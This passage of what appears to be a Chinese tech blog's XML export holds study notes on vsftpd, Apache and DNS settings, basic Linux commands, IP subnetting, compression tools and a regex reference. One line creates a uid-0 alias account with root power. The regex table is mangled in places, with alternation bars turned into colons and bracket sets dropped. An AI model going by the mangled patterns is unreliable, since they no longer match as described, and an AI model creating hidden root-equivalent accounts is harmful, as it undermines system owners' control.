的配置文件就只有这一个。这个配置文件的设置是以 bash 的变量相同的设置方式来处理的,也就是 “参数=设置值” 来设置的,注意,等号两边不能有空格。/etc/vsftpd/chroot_list用来限制用户只能在家目录的文件,需要在主配置文件中进行配置,默认没有这个文件,需要手动创建,如果文件名不同,主配置文件也要对其相应的修改。/etc/vsftpd/ftpusers黑名单列表,就是用来规定哪些用户不能登录 FTP。查看主配置文件的帮助man 5 vsftpd.conf 重要选项说明全局设置write_enable=YES/NO是否允许登陆用户有写权限。属于全局设置,默认值为 YES。data_connection_timeout=120设置建立 FTP 数据连接的超时时间,单位为秒。默认值为 120。idle_session_timeout=300设置多长时间不对 FTP 服务器进行任何操作,则断开该 FTP 连接,单位为秒。默认值为 300 。与本地用户相关的设置值local_enable=YES/NO控制是否允许本地用户登入,YES 为允许本地用户登入,NO 为不允许。默认值为 YES。local_umask=022本地用户新增档案时的 umask 值。默认值为 077。file_open_mode=0755本地用户上传档案后的档案权限,与 chmod 所使用的数值相同。默认值为 0666。userlist_enable=YES/NO设置是否阻止 user_list 文件中的用户登录 FTP 服务器,默认为 YES与虚拟用户相关的设置值guest_enable=YES/NO启用虚拟用户。默认值为 NO。启用时,非匿名用户登录的帐号,会被当成访客,访客在 vsFTP 中默认会取得 FTP 这个用户的权限。guest_username=FTP在 guest_enable=YES 下才生效,指定游客的身份而已。默认为 FTP。user_config_dir=指定游客用户的配置文件存放的目录,无默认值,需自己定义。与匿名用户相关的设置值anonymous_enable=YES/NO控制是否允许匿名用户登入,YES 为允许匿名登入,NO 为不允许。anon_upload_enable=YES/NO如果设为 YES,则允许匿名登入者有上传文件（非目录）的权限,只有在 write_enable=YES 时,此项才有效。当然,匿名用户必须要有对上层目录的写入权。默认值为 NO。anon_world_readable_only=YES/NO如果设为 YES,则允许匿名登入者下载可阅读的档案（可以下载到本机阅读,不能直接在 FTP 服务器中打开阅读）。默认值为 YES。anon_mkdir_write_enable=YES/NO如果设为 YES,则允许匿名登入者有新增目录的权限,只有在 write_enable=YES 时,此项才有效。当然,匿名用户必须要有对上层目录的写入权。默认值为 NO。anon_other_write_enable=YES/NO如果设为 YES,则允许匿名登入者更多于上传或者建立目录之外的权限,譬如删除或者重命名。（如果 anon_upload_enable=NO,则匿名用户不能上传文件,但可以删除或者重命名已经存在的文件；如果 anon_mkdir_write_enable=NO,则匿名用户不能上传或者新建文件夹,但可以删除或者重命名已经存在的文件夹。）默认值为 NO。与用户限制相关的设置值chroot_list_enable=YES/NO设置是否启用 chroot_list_file 配置项指定的用户列表文件。默认值为 NO。chroot_list_file=/etc/vsftpd.chroot_list用于指定用户列表文件,该文件用于控制哪些用户可以切换到用户家目录的上级目录。chroot_local_user=YES/NO用于指定用户列表文件中的用户是否允许切换到上级目录。默认值为 NO。服务的启动与停止FTP 的服务名并不叫做 vsftp,而是 vsftpd。service vsftpd status # 状态 service vsftpd start # 启动 service vsftpd stop # 暂停 service vsftpd restart # 重启 设置开机自启chkconfig --list | grep vsftpd # 查看自启状态 chkconfig --level 35 vsftpd on # 设置开机自启 APACHE 服务APACHE 是一款 WEB 服务器软件,它可以运行在几乎所有广泛使用的计算机平台上,由于其跨平台和安全性被广泛使用,是最流行的 WEB 服务器端软件之一。使用到的端口号超文本传输协议（默认为 80 端口）更安全的超文本传输协议（默认为 443 端口）所需软件APACHE 服务需要较多的软件进行支持,RedHat 已经预装了此软件,这里就不一一阐述了。主要的配置文件/etc/httpd/conf/httpd.conf最主要的配置文件,里买内包含了 APACHE 服务器主配置文件. 包括服务器指令的目录设置。查看配置文件爱呢的帮助man 5 httpd.conf 重要选项说明Listen 80设置监听的端口号DocumentRoot “/var/www/html”定义网站的根目录,默认的目录在 /var/www/html,修改此选项时,要同时修改下面一个选项。\&lt;Directory “/var/www/html”&gt;定义网站的一个目录,修改此选项时,要同时修改上面一个选项。Alias /icons/ “/var/www/icons”目录的别名设置,就是浏览器访问 http://[host]/icons 时,实际上访问的是 /var/www/icons 目录,配置此选项时,要同时配置下面的目录权限。\&lt;Directory “/var/www/icons”&gt;Options Index FollowSymLinksIndex 设置是否开启目录浏览,默认启用,禁止在前面加一个 -FollowSymLinks 设置是否禁用符号连接追踪,默认启用,禁止在前面加一个 -Allow from all配置白名单,默认允许所有的 IP 段访问。ServerSignature On配置是否隐藏 APACHE 的版本信息,默认是开启,还可以设置为 Off 和 EMail。其中 Off 是隐藏信息,EMail 是会显示管理员的 email 信息的。NameVirtualHost *:443设置开放的端口,一般在配置 https 时候修改它,修改这个选项,要同时修改下面一个选项。\&lt;VirtualHost *:443&gt;设置开放的端口。服务的启动与停止APACHE 的服务名并不叫做 http,而是 httpd。service httpd status # 状态 service httpd start # 启动 service httpd stop # 暂停 service httpd restart # 重启 设置开机自启chkconfig --list | grep httpd # 查看自启状态 chkconfig --level 35 httpd on # 设置开机自启 DNS 服务DNS（Domain Name Server,域名服务器）是进行域名(domain name)和与之相对应的 IP 地址 (IP address) 转换的服务器。使用到的端口号UDP 解析（默认为 53 端口）所需软件bindDNS 主要的包,包含 named 守护进程（用来回答查询结果的）,还有一些重要命令：nslookup,dig 和 host,等等。caching-nameserver包含 DNS 的主配置文件模板,区域配置文件模板等。主配置文件/etc/named-caching-nameserver.confDNS 主配置文件,实际中需要把此文件复制成 named.conf,方能使用/etc/named-rfc1912.zonesDNS 区域配置文件,实际中需要把此文件复制成 named.zones,方能使用/var/named/named.zeroDNS 正向解析文件,实际中需要把此文件复制成 named.zones 中配置的文件名/var/named/named.localDNS 反向解析文件,实际中需要把此文件复制成 named.zones 中配置的文件名查看主配置文件的帮助man 5 named-caching-nameserver.conf 重要选项说明allow-query { any;};表示所有人能查询这台服务器,可以修改成 IP 地址或网段,限制其查询allow-recursion { any;};只针对收到的递归查询请求,对于非递归请求不关心,可以修改成 IP 地址或网段,限制其递归查询allow-transfer { any;};限制哪些主机或者网络可以传递信息至区域文件服务的启动与停止DNS 的服务名并不叫做 name,而是 named。service named status # 状态 service named start # 启动 service named stop # 暂停 service named restart # 重启 设置开机自启chkconfig --list | grep named # 查看自启状态 chkconfig --level 35 named on # 设置开机自启]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 学习笔记（五）：基础操作]]></title>
    <url>%2Farchives%2Fa5687d4.html</url>
    <content type="text"><![CDATA[本篇是 Liunx 的学习笔记系列第五篇,这一篇将介绍 Liunx 的基础操作。很多人觉得 Liunx 非常难学,但不其然,只要掌握一些基础的命令操作,Liunx 还是非常好上手的Liunx 终端终端和控制台的区别终端 (Terminal) 和控制台 (Console) 是有区别的终端本质上是对应着 Liunx 上的 /dev/tty 设备,Liunx 的多用户登陆就是通过不同的 /dev/tty 设备完成的,Liunx 默认提供了 6 个纯命令行界面的 &quot;terminal&quot; （准确的说这里应该是 6 个 virtual consoles）来让用户登录,你可以通过使用 [Ctrl]+[Alt]+[F1]～[F6] 进行切换,不过在在线实验环境中可能无法切换,因为特殊功能按键会被你主机系统劫持。当你切换到其中一个终端后想要切换回图形界面,你可以按下 [Ctrl]+[Alt]+[F7] 来完成ShellShell 是指”提供给使用者使用界面”的软件（命令解析器）,类似于 DOS 下的 command (命令行)和后来的 cmd.exe。之所以被称作 shell 是因为它隐藏了操作系统底层的细节。就像是个 Shell (壳),有壳就有核,这里的核就是指的 UNIX/Liunx 内核。重要的快捷键（只列出常用的）按键作用Tab进行命令补全Ctrl+c强行终止当前程序（最常用,你可以放心它并不会使终端退出)Ctrl+d这个才是强制退出终端的(不用敲 exit 了)Ctrl+s暂定当前程序,暂停后按下任意键恢复运行(网络交互有用)Ctrl+z将当前程序放到后台运行,恢复到前台为命令 fgCtrl+u删除光标所在的整行Ctrl+l清屏,最常用Ctrl+k删除从光标所在位置到行末Alt+Backspace向前删除一个单词Shift+PgUp将终端显示向上滚动Shift+PgDn将终端显示向下滚动使用通配符举例:touch love_{1..10}_Liunx.txt shell 常用通配符通配符作用*匹配 0 或多个字符?匹配任意一个字符[list]匹配 list 中的任意单一字符[!list]匹配 除 list 中的任意单一字符以外的字符[c1-c2]匹配 c1-c2 中的任意单一字符 如：[0-9] [a-z]{string1,string2,…}匹配 sring1 或 string2 (或更多)其一字符串{c1..c2}匹配 c1-c2 中全部字符 如 {1..10}命令手册速查Liunx 下命令成千上百,有个速查手册也是不错的,Liunx 命令速查手册Liunx 用户管理获取当前登录的用户who # 获取当前登录的所有用户信息（包括远程登录） whoami # 获取当前登录的用户名 who am i # 获取当前登录用户的信息 第一列表示打开当前伪终端的用户的用户名第二列的 pts/0 中 pts 表示伪终端,所谓伪是相对于 /dev/tty 设备而言的,使用 [Ctrl]+[Alt]+[F1]～[F7] 进行切换的 /dev/tty 设备,这是”真终端”,伪终端就是当你在图形用户界面使用 /dev/tty7 时每打开一个终端就会产生一个伪终端,pts/0 后面那个数字就表示打开的伪终端序号第三列则表示当前伪终端的启动时间创建用户、切换用户adduser [userName] # 通过询问的方式进行新增用户 useradd -m [userName] # 通过自行添加参数方式新增用户 useradd -u 0 -o [userName] # 添加 uid 为 0 的用户,即 root 用户的别名,拥有 root 的权限 userdel -r [userName] # 永久删除用户 id # 查看用户的 uid 或 gid 等信息 su - # 切换到 root 用户 su - [userName] # 切换某一个用户 passwd # 为当前用户设置密码 用户信息将被保存至 /etc/passwd,用户密码将被保存至 /etc/shadow使用 root 用户可以修改其内容,只需使用 wq!,强制保存就好创建组、添加组成员groupadd [groupName] # 添加用户组 groupdel [groupName] # 删除用户组 usermod -G [groupName] [userName] # 将用户 添加至用户组,-G 附属组,-g 主属组 组信息将被保存至 /etc/group,组密码将保存至 /etc/gshadow使用 root 用户可以修改其内容,只需使用 wq!,强制保存就好禁用和解锁用户passwd 方法passwd -l [userName] #禁用 passwd -u [userName] #解锁 修改 /etc/shadow 文件（root 用户）vim /etc/shadow 禁用则在密码位前手工添加 ! （启用删除 ! 即可）,如：test:!$1$afiVSYfG$utdc2qWLNrqNcy63Ca8301:16998:0:99999:7::: 或test:!!$1$afiVSYfG$utdc2qWLNrqNcy63Ca8301:16998:0:99999:7::: 使用 :wq! 强制保存usermod 方法usermod -L [userName] #禁用 usermod -U [userName] #解锁 设置用户一登录就要修改密码chage -d 0 [userName] # 这个命令其实是把密码修改日期归 0 了 （/etc/shadow 文件第 3 个字段） 查看当前登录的用户的环境变量env Liunx 文件权限查看文件权限ls -l # 可以简写成 ll,注意有些版本的 Liunx 不支持 权限介绍通常我们使用数字表示权限,4 为读取权限,2 为写入权限,1 为执行权限。所以权限为 777 的为最高权限权限的设置chmod 777 text.txt # 设置最高权限 chmod o+w text.txt # 为其他用户添加写权限 chmod g-r text.txt # 为组中的所有用户去除读权限 修改所属者和所属组chown root text.txt # 修改所属者 chgrp text text.txt # 修该所属组 chown root:text text.txt # 修改所属者和所属组 Liunx 文件的基本操作（很重要且很常用）文件操作touch test # 新建一个空文件 echo &quot;this is a text&quot; &gt; test.txt # 输出内容重定向到文件,&gt; 覆盖操作 echo &quot;this is a text&quot; &gt;&gt; test.txt # 输出内容重定向到文件,&gt;&gt; 追加操作 rm -f test.txt # 删除文件 目录操作mkdir [folderName] # 新建目录 mkdir -p [path]/[folderName] # 若父级目录不存在,则一起创建 rm -rf [path]/[folderName] # 删除目录 复制操作cp test [path]/[folderName] # 复制文件爱内 cp -r [path]/[folderName] [path]/[folderName] # 复制目录 移动、重命名操作mv [fileName] [path]/[folderName] # 移动文件 mv [fileName1] [fileName2] # 重命名 # 先用通配符批量创建 5 个文件 touch file{1..5}.txt # 批量将这 5 个后缀为 .txt 的文本文件重命名为以 .c 为后缀的文件 rename &#39;s/\.txt/\.c/&#39; *.txt # 批量将这 5 个文件,文件名改为大写 rename &#39;y/a-z/A-Z/&#39; *.c 查看文件cat /etc/passwd tail -n 5 /etc/passwd # 只输出文件的末尾 5 行 file /bin/ls # 可以查看文件的类型 适用于快速查看文件,都是用来打印文件内容到标准输出（终端),相同的命令有：cat (正序)、tac (倒序)、tail(按要求输出)和 nl 命令搜索文件whereis直接从数据库中查询简单快速whereis ls # 直接从数据库中查询简单快速 locate快而全通过 &quot;/var/lib/mlocate/mlocate.db&quot; 数据库查找,不过这个数据库也不是实时更新的,系统会使用定时任务每天自动执行 updatedb 命令更新一次,所以有时候你刚添加的文件,它可能会找不到,你就得自己执行一次 updatedb 命令（在我们的环境中必须先执行一次该命令）。它可以用来查找指定目录下的不同文件类型,如：查找 /etc 下所有以 sh 开头的文件locate /etc/sh 注意,它不只是在 etc 目录下查找并会自动递归子目录进行查找 查找 /usr/share/ 下所有 jpg 文件locate /usr/share/*.jpg 注意要添加 * 号前面的反斜杠转义,否则会无法找到 只统计数目可以加上 -c 参数,-i 参数忽略大小写进行查找,whereis 的 -b,-m,-s 同样适用which避免了进入程序进行测试,很有用which 本身是 shell 内建的一个命令,我们通常使用 which 来确定是否安装了某个指定的软件,因为它只从 PATH 环境变量指定的路径中去搜索命令which man find太精和太细,知道前面的命令就已经足够了find 应该是这几个命令中最强大的了,它不但可以通过文件类型、文件名进行查找而且可以根据文件的属性（如文件的时间戳,文件的权限等）进行搜索举个栗子：在指定目录下搜索指定文件名的文件find /etc/ -name interfaces 注意 find 命令的路径是作为第一个参数的, 基本命令格式为 find [path] [option] [action]简单文件系统操作查看磁盘和目录的容量使用 df 命令查看磁盘的容量df # 以 blocks 的大小展示 df -h # 人性化输出,以更易读的方式展示 使用 du 命令查看目录的容量# 默认同样以blocks的大小展示 du # 加上-h参数,以更易读的方式展示 du -h # 只查看1级目录的信息 du -h -d 0 ~ # 查看2级$ du -h -d 1 ~ 挂载光盘和卸载光盘mount /dev/cdrom /mnt/cdrom # 挂载光盘 umount /dev/cdrom # 卸载光盘 wc 命令,简单小巧的计数工具wc /etc/passwd 分别只输出行数、单词数、字节数、字符数和输入文本中最长一行的字节数# 行数 wc -l /etc/passwd # 单词数 wc -w /etc/passwd # 字节数 wc -c /etc/passwd # 字符数 wc -m /etc/passwd # 最长行字节数 wc -L /etc/passwd 注意：对于西文字符来说,一个字符就是一个字节,但对于中文字符一个汉子是大于 2 个字节的,具体数目是由字符编码决定的常用的文本处理命令tr 命令tr 命令可以用来删除一段文本信息中的某些文字。或者将其进行转换 使用方式：tr [option]...SET1 [SET2] 常用选项：选项说明-d删除和 set1 匹配的字符,注意不是全词匹配也不是按字符顺序匹配-s去除 set1 指定的在输入文本中连续并重复的字符操作举例：# 删除 &quot;hello shiyanlou&quot; 中所有的&#39;o&#39;,&#39;l&#39;,&#39;h&#39; echo &#39;hello shiyanlou&#39; | tr -d &#39;olh&#39; # 将&quot;hello&quot; 中的ll,去重为一个l echo &#39;hello&#39; | tr -s &#39;l&#39; # 将输入文本,全部转换为大写或小写输出 cat /etc/passwd | tr &#39;[:lower:]&#39; &#39;[:upper:]&#39; # 上面的&#39;[:lower:]&#39; &#39;[:upper:]&#39;你也可以简单的写作&#39;[a-z]&#39; &#39;[A-Z]&#39;,当然反过来将大写变小写也是可以的 col 命令col 命令可以将 Tab 换成对等数量的空格建,或反转这个操作.用来格式化代码超爽 使用方式：col [option] 常用的选项有：选项说明-x将 Tab 转换为空格-h将空格转换为 Tab（默认选项）操作举例：# 查看/etc/protocols中的不可见字符,可以看到很多^I,这其实就是Tab键转义成可见字符的符号 cat -A /etc/protocols # 使用col -x将/etc/protocols中的Tab转换为空格,然后再使用cat查看,你发现^I不见了 cat /etc/protocols | col -x | cat -A]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Command</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IP 地址规划]]></title>
    <url>%2Farchives%2F2689f5dc.html</url>
    <content type="text"><![CDATA[当申请到一个 C 类网络地址时,很多时候需要对其子网划分,那么一个高效简便的子网划分方法由此而生先分清五类网络地址IP 地址分为 A,B,C,D,E 五类网络号：用于识别主机所在的网络主机号：用于识别该网络中的主机其中 A 类分配给政府机关使用,B 类地址给大中型企业使用,C 类地址给个人使用。这三种是主要的。D 类用于组播,E 类用于实验,各类可容纳的地址数目不同。其中 A 类、B 类、C 类这三类地址用于 TCP/IP 节点。其它两类 D 类和 E 类被用于特殊用途。A、B、C 三类 IP 地址的特征：当将 IP 地址写成二进制形式时,A 类地址的第一位总是 O,B 类地址的前两位总是 10,C 类地址的前三位总是 110。A 类地址A 类地址第 1 字节为网络地址,其它 3 个字节为主机地址A 类地址范围：1.0.0.1 — 126.255.255.254A 类地址中的私有地址和保留地址（所谓的私有地址就是在互联网上不使用,而被用在局域网络中的地址；保留地址则不被分配。）10.X.X.X 是私有地址127.X.X.X 是保留地址,用做循环测试用的最大的网络数： 2^7-2,网络中最大的主机数：2^24-2B 类地址B 类地址第 1 字节和第 2 字节为网络地址,其它 2 个字节为主机地址B 类地址范围：128.0.0.1 — 191.255.255.254B 类地址的私有地址和保留地址172.16.0.0 — 172.31.255.255 是私有地址169.254.X.X 是保留地址。如果你的 IP 地址是自动获取 IP 地址,而你在网络上又没有找到可用的 DHCP 服务器。就会得到其中一个 IP最大的网络数： 2^14-2,网络中最大的主机数：2^16-2C 类地址C 类地址第 1 字节、第 2 字节和第 3 个字节为网络地址,第 4 个个字节为主机地址。另外第 1 个字节的前三位固定为 110C 类地址范围：192.0.0.1 — 223.255.255.254C 类地址中的私有地址：192.168.X.X 是私有地址最大的网络数： 2^21-2,网络中最大的主机数：2^8-2D 类地址D 类地址不分网络地址和主机地址,它的第 1 个字节的前四位固定为 1110D 类地址范围：224.0.0.1 — 239.255.255.254E 类地址E 类地址也不分网络地址和主机地址,它的第 1 个字节的前五位固定为 11110E 类地址范围：240.0.0.1 — 255.255.255.254C 类 IP 地址规划首先,准确的记住 2^1 ~ 2^8 的得数2^1 = 2 2^2 = 4 2^3 = 8 2^4 = 16 2^5 = 32 2^6 = 64 2^7 = 128 2^8 = 256 地址划分划分时要么根据主机数来划分；要么根据子网数来划分。第一种情况已知 IP 地址段和子网个数,求子网的规划已知,某公司总部申请到 200.200.200.0 网段,该公司总部有三个部门。 每个部门都将拥有属于该部门的子网,写出每个部门将会分配到的IP地址段（包含网络地址和广播地址）。 解析： 要划分 3 个子网,那么 2^n&gt;=3 ,得出 n&gt;=2 ,取 n=2 ,即 2^2=4 ,可以划分四个子网。每个子网有 2^(8-2)-2=62 个主机。广播号等于网络号加 (2^(8-2)-1),子网掩码为 24+2=26。答案：四个子网分别是: A: 200.200.200.0/26 ~ 200.200.200.63/26 B：200.200.200.64/26 ~ 200.200.200.127/26 C：200.200.200.128/26 ~ 200.200.200.191/26 D：200.200.200.192/26 ~ 200.200.200.255/26 第二种情况已知 IP 地址段和各子网的主机个数,求子网规划已知,某公司总部申请到 200.200.200.0 网段,该公司总部有三个部门, 分别是 A 部们、B 部门、 C 部门, 其中 A 部门有 100 台电脑,B 部门有 48 台电脑,C 部门有 50 台电脑, 写出每个部门将会分配到的 IP 地址段（包含网络地址和广播地址）。 解析：要划分 3 个子网,第一个子网有 100 台主机,那么 2^n&gt;=100,得出 n&gt;=7,则该子网总共能容纳主机数为 2^7-2=126。广播号等于网络号加上 (2^7-1),该子网的掩码为 32-7=25。以此类推。答案：三个子网分别是: A：200.200.200.0/25 ~ 200.200.200.127/25 B：200.200.200.128/26 ~ 200.200.200.191/26 C：200.200.200.192/26 ~ 200.200.200.255/26 IP 地址规划练习已知,某公司总部申请到 211.91.5.0 网段,该公司总部有六个部门, 每个部门对应的电脑台数分别是 A 部门 100 台、B 部门 50 台、C 部门 10 台、E 部门 10 台、F 部门 10 台。 写出每个部门将会分配到的 IP 地址段（包含网络地址和广播地址）。 解析：要划分 6 个子网,第一个子网有 100 台主机,那么 2^n&gt;=100,得出 n&gt;=7,则该子网总共能容纳主机数为 2^7-2=126。广播号等于网络号加上 (2^7-1),该子网的掩码为 32-7=25。以此类推。答案：六个子网分别是: A：211.91.5.0/25 ~ 211.91.5.127/25 B：211.91.5.128/26 ~ 211.91.5.191/26 C：211.91.5.192/28 ~ 211.91.5.207/28 D：211.91.5.208/28 ~ 211.91.5.223/28 E：211.91.5.224/28 ~ 211.91.5.239/28 F：211.91.5.240/28 ~ 211.91.5.255/28]]></content>
      <categories>
        <category>networking</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 学习笔记（三）：文件的压缩与解压缩]]></title>
    <url>%2Farchives%2F7270a2e0.html</url>
    <content type="text"><![CDATA[本篇是 Liunx 的学习笔记系列第三篇,这一篇将介绍在 Liunx 下压缩解压文件或目录常用命令。压缩文件及目录可以大大增加磁盘的利用率.gz 格式gzip [fileName] # 压缩文件 gzip -d [fileName].gz # 解压缩文件 gunzip [fileName].gz # 解压缩文件 注意：只能压缩文件而不能压缩目录,且不保留原文件.tar.gz 格式tar -czvf [folderName].tar.gz [folderName] # 压缩目录或文件 tar -xzvf [folderName].tar.gz # 解压目录或文件 选项解释-c # 打包 -x # 解包 -v # 显示详细信息 -f # 指定文件名 -z # 打包同时压缩 / 解压缩 注意：可以打包或压缩目录和文件,-f 选项是必须的,且必须放在选项中的最后一位,可以保留原文件.zip 格式zip -r [folderName].zip [folderName] # 压缩目录 zip [fileName].zip [fileName] # 压缩文件 unzip [fileName].zip # 压缩目录或文件 选项解释-r 压缩目录 .gz 格式gzip [fileName] # 压缩文件 gzip -d [fileName].gz # 解压缩文件 gunzip [fileName].gz # 解压缩文件 注意：只能压缩文件而不能压缩目录,且不保留原文件.zip 格式zip -r [folderName].zip [folderName] # 压缩目录 zip [fileName].zip [fileName] # 压缩文件 unzip -uo [fileName].zip -d [folderName] # 解压缩目录或者文件 选项解释-r # 压缩目录 注意：可以压缩目录或文件,-r 选项用于压缩目录,可以保留原文件.bz2 格式bzip2 -k [fileName] # 压缩文件且保留原文件 tar -cjvf [folderName].tar.bz2 [folderName] # 压缩目录或文###件 bunzip -k [fileName].bz2 # 解压缩文件 tar -xjvf [folderName].tar.bz2 # 解压缩文件 选项解释-k # 产生压缩文件后保留原文件 -j # 格式为 .bz2 的压缩包 注意：bzip2 命令,只能压缩文件,不能压缩目录,要使原文件保留,使用 -k 选 项；要压缩目录使用 tar 命令的 -j 选项 用 tar 命令的 -j 选项]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Command</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用的正则表达式]]></title>
    <url>%2Farchives%2Fe89e918.html</url>
    <content type="text"><![CDATA[很多不太懂正则的童鞋,在遇到需要用正则校验数据时,往往是在网上去找很久,结果找来的还是不很符合要求。所以我把开发中常用的一些正则表达式整理了一下,包括校验数字、字符、一些特殊的需求等等基础的正则表达式正则表达式-菜鸟教程字符描述\将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如,”n”匹配字符”n”。”\n”匹配一个换行符。串行”\”匹配”\”而”(“则匹配”(“。^匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性,^也匹配”\n”或”\r”之后的位置。$匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性,$也匹配”\n”或”\r”之前的位置。*匹配前面的子表达式零次或多次。例如,zo能匹配”z”以及”zoo”。等价于{0,}。+匹配前面的子表达式一次或多次。例如,”zo+”能匹配”zo”以及”zoo”,但不能匹配”z”。+等价于{1,}。?匹配前面的子表达式零次或一次。例如,”do(es)?”可以匹配”does”或”does”中的”do”。?等价于{0,1}。{n}n是一个非负整数。匹配确定的n次。例如,”o{2}”不能匹配”Bob”中的”o”,但是能匹配”food”中的两个o。{n,}n是一个非负整数。至少匹配n次。例如,”o{2,}”不能匹配”Bob”中的”o”,但能匹配”foooood”中的所有o。”o{1,}”等价于”o+”。”o{0,}”则等价于”o*”。{n,m}m和n均为非负整数,其中n&lt;=m。最少匹配n次且最多匹配m次。例如,”o{1,3}”将匹配”fooooood”中的前三个o。”o{0,1}”等价于”o?”。请注意在逗号和两个数之间不能有空格。?当该字符紧跟在任何一个其他限制符（*,+,?,{n},{n,},{n,m}）后面时,匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串,而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如,对于字符串”oooo”,”o+?”将匹配单个”o”,而”o+”将匹配所有”o”。.匹配除”\n”之外的任何单个字符。要匹配包括”\n”在内的任何字符,请使用像”(`.:\n`)”的模式。(pattern)匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到,在VBScript中使用SubMatches集合,在JScript中则使用$0…$9属性。要匹配圆括号字符,请使用”(“或”)”。(?:pattern)匹配pattern但不获取匹配结果,也就是说这是一个非获取匹配,不进行存储供以后使用。这在使用或字符”`(:)&quot;来组合一个模式的各个部分是很有用。例如&quot;industr(?:y:ies)&quot;就是一个比&quot;industry:industries`”更简略的表达式。(?=pattern)正向肯定预查,在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配,也就是说,该匹配不需要获取供以后使用。例如,”`Windows(?=95:98:NT:2000)`”能匹配”Windows2000”中的”Windows”,但不能匹配”Windows3.1”中的”Windows”。预查不消耗字符,也就是说,在一个匹配发生后,在最后一次匹配之后立即开始下一次匹配的搜索,而不是从包含预查的字符之后开始。(?!pattern)配”Windows3.1”中的”Windows”,但不能匹配”Windows2000”中的”Windows”。预查不消耗字符,也就是说,在一个匹配发生后,在最后一次匹配之后立即开始下一次匹配的搜索,而不是从包含预查的字符之后开始(?&lt;=pattern)反向肯定预查,与正向肯定预查类拟,只是方向相反。例如,”`(?&lt;=95:98:NT:2000)Windows`”能匹配”2000Windows”中的”Windows”,但不能匹配”3.1Windows”中的”Windows”。(?&lt;!pattern)反向否定预查,与正向否定预查类拟,只是方向相反。例如”`(?&lt;!95:98:NT:2000)`Windows”能匹配”3.1Windows”中的”Windows”,但不能匹配”2000Windows”中的”Windows”。`x:y`匹配x或y。例如,”`z:food”能匹配&quot;z&quot;或&quot;food&quot;。&quot;(z:f)ood`”则匹配”zood”或”food”。[xyz]字符集合。匹配所包含的任意一个字符。例如,”[abc]”可以匹配”plain”中的”a”。[^xyz]负值字符集合。匹配未包含的任意字符。例如,”abc“可以匹配”plain”中的”p”。[a-z]字符范围。匹配指定范围内的任意字符。例如,”[a-z]”可以匹配”a”到”z”范围内的任意小写字母字符。[^a-z]负值字符范围。匹配任何不在指定范围内的任意字符。例如,”a-z“可以匹配任何不在”a”到”z”范围内的任意字符。\b匹配一个单词边界,也就是指单词和空格间的位置。例如,”er\b”可以匹配”never”中的”er”,但不能匹配”verb”中的”er”。\B匹配非单词边界。”er\B”能匹配”verb”中的”er”,但不能匹配”never”中的”er”。\cx匹配由x指明的控制字符。例如,\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则,将c视为一个原义的”c”字符。\d匹配一个数字字符。等价于[0-9]。\D匹配一个非数字字符。等价于0-9。\f匹配一个换页符。等价于\x0c和\cL。\n匹配一个换行符。等价于\x0a和\cJ。\r匹配一个回车符。等价于\x0d和\cM。\s匹配任何空白字符,包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。\S匹配任何非空白字符。等价于 \f\n\r\t\v。\t匹配一个制表符。等价于\x09和\cI。\v匹配一个垂直制表符。等价于\x0b和\cK。\w匹配包括下划线的任何单词字符。等价于”[A-Za-z0-9_]”。\W匹配任何非单词字符。等价于”A-Za-z0-9_“。\xn匹配n,其中n为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如,”\x41”匹配”A”。”\x041”则等价于”\x04&amp;1”。正则表达式中可以使用ASCII编码。\num匹配num,其中num是一个正整数。对所获取的匹配的引用。例如,”(.)\1”匹配两个连续的相同字符。\n标识一个八进制转义值或一个向后引用。如果\n之前至少n个获取的子表达式,则n为向后引用。否则,如果n为八进制数字（0-7）,则n为一个八进制转义值。\nm标识一个八进制转义值或一个向后引用。如果\nm之前至少有nm个获得子表达式,则nm为向后引用。如果\nm之前至少有n个获取,则n为一个后跟文字m的向后引用。如果前面的条件都不满足,若n和m均为八进制数字（0-7）,则\nm将匹配八进制转义值nm。\nml如果n为八进制数字（0-3）,且m和l均为八进制数字（0-7）,则匹配八进制转义值nml。\un匹配n,其中n是一个用四个十六进制数字表示的Unicode字符。例如,\u00A9匹配版权符号（©）。校验数字的表达式数字 =&gt; ^[0-9]*$n 位的数字 =&gt; ^\d{n}$至少 n 位的数字 =&gt; ^\d{n,}$m-n 位的数字 =&gt; ^\d{m,n}$零和非零开头的数字 =&gt; ^(0|[1-9][0-9]*)$非零开头的最多带两位小数的数字 =&gt; ^([1-9][0-9]*)+(.[0-9]{1,2})?$带 1-2 位小数的正数或负数 =&gt; ^(-)?\d+(.\d{1,2})?$正数、负数、和小数 =&gt; ^(-|+)?\d+(.\d+)?$有两位小数的正实数 =&gt; ^[0-9]+(.[0-9]{2})?$有 1~3 位小数的正实数 =&gt; ^[0-9]+(.[0-9]{1,3})?$非零的正整数 =&gt; ^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$非零的负整数 =&gt; ^-[1-9]\d*$非负整数 =&gt; ^\d+$ 或 ^[1-9]\d*|0$非正整数 =&gt; ^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$非负浮点数 =&gt; ^\d+(.\d+)?$ 或 ^[1-9]\d*.\d*|0.\d*[1-9]\d*|0?.0+|0$非正浮点数 =&gt; ^((-\d+(.\d+)?)|(0+(.0+)?))$正浮点数 =&gt; ^[1-9]\d*.\d*|0.\d*[1-9]\d*$负浮点数 =&gt; ^-([1-9]\d*.\d*|0.\d*[1-9]\d*)$浮点数 =&gt; ^(-?\d+)(.\d+)?$ 